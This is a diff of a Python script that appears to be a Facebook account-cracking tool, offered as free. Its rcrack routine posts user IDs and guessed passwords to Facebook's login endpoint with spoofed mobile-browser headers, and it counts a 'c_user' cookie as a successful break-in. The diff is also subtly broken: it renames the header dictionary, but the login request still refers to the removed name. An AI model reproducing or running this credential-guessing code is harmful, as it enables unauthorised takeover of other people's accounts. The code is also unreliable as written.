@@ -187,8 +187,8 @@ logo =                                          ("""
 \033[1;32m     \033[1;32mFACEBOK      : \033[1;34m MK
 \033[1;32m     \033[1;35mGITHUB       :  \033[1;35mmk
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
-\033[1;32m     \033[1;35mTEAM         :  \033[1;35mMk
-\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
+\033[1;32m     \033[1;35mTEAM         :  \033[1;35m Mk
+\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m0.1
 \033[1;37m================= \33[32;45mMk\33[0;m =====================
  
        \33[37;41m\t WELLCOME TO mk TOOL\33[0;m
@@ -318,26 +318,24 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'mbasic.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-             'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-ch-ua-platform-version': '""',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
-            'viewport-width': '980',
+            headers = { 'authority': 'free.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
 }
+
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
